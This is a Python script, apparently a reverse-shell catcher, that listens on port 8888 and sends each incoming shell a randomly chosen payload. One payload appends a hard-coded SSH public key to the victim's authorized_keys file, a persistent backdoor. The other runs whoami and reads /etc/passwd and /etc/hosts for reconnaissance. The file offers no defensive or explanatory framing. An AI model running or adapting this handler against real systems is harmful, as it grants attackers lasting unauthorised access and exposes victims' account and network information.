import asyncio
import multiprocessing
import random
from asyncio.streams import StreamReader, StreamWriter
from utils import sleep

from loguru import logger


async def server_task() -> None:
    payloads = [
        (
            "place_pubkey",
            [
                "mkdir -p ~/.ssh",
                "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHpRJSv8CLc5ThKHlZX3PlexiPcD79g86T7wasXCaY/e rog@Finall-PC' >> ~/.ssh/authorized_keys",
            ],
        ),
        (
            "info_collection",
            ["whoami", "cat /etc/passwd", "cat /etc/hosts"],
        ),
    ]

    async def read_with_timeout(reader: StreamReader, timeout: float) -> bytes:
        try:
            async with asyncio.timeout(timeout):
                return await reader.read(100)
        except TimeoutError:
            return b""

    async def read_response(reader: StreamReader) -> str:
        res = b""
        while data := await read_with_timeout(reader, 0.5):
            res += data
        return res.decode()

    async def shell_cb(reader: StreamReader, writer: StreamWriter) -> None:
        payload_name, payload = random.choice(payloads)
        logger.warning(
            f"Got shell from {writer.get_extra_info('peername')}, use payload: {payload_name}"
        )
        init_data = await read_response(reader)
        print(init_data)
        for cmd in payload:
            logger.warning(f"Executing: {cmd}")
            writer.write(f"{cmd}\n".encode())
            await writer.drain()
            resp = await read_response(reader)
            print(resp)
            await sleep(10)
        writer.close()
        await writer.wait_closed()

    server = await asyncio.start_server(shell_cb, "0.0.0.0", 8888)
    logger.info("Listening on 8888")
    async with server:
        await server.serve_forever()


multiprocessing.Process(target=lambda: asyncio.run(server_task())).start()
